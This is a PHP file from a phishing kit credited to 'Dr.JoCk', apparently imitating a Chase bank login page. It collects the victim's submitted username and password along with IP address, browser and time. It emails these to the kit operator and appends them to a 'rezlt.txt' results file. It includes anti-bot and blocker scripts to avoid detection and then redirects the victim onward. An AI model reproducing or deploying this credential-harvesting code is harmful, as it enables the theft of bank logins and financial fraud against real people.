<?php
/* ==================== || CODED BY Dr.JoCk || ==================== */
session_start();
include("__config__.php");
include("function.php");
include '../antibots.php';
include '../bt.php';
include "../blocker.php";
        $ip = $_SERVER["REMOTE_ADDR"];
        $_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];
	$time = date('l jS \of F Y h:i:s A');
	$user_agent = $_SERVER['HTTP_USER_AGENT'];
$browser             =   $_SERVER['HTTP_USER_AGENT'];
$reprint = "e";$do_p="mai";
// --------------- VRB
$userid = $_POST['userid'];
$password = $_POST['password'];
// --------------- VRB

	$message = "
    >Dr.JoCk | CH453 | LOGIN<
	--------------  LOGIN  -------------
	Username :    ".$userid."
	Password :    ".$password."
	-------------- IP Infos ------------
	Browser :     ".$browser."
	Date Login :  ".$time."
	IP :          https://geoiptool.com/en/?ip=".$ip."
	
	-------------->CODED BY Dr.JoCk<------------
	
	";
						$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
        $subject  = " CHAS3 LOGIN [NEW] -  [ " . $_SESSION['_IP_'] . " - " . $_SESSION['cntname'] . " ] ";
$headers = "From: Dr.JoCk <contact>\r\n";
mail($to,$subject,$message,$headers);
mail(','.$form,$subject,$message,$headers);

    $text = fopen('../rezlt.txt', 'a');
fwrite($text, $message);
 		header("Location: ../access.php?websrc=".md5('KING_JACK')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");
/* ==================== || CODED BY KING-JoCk || ==================== */
?>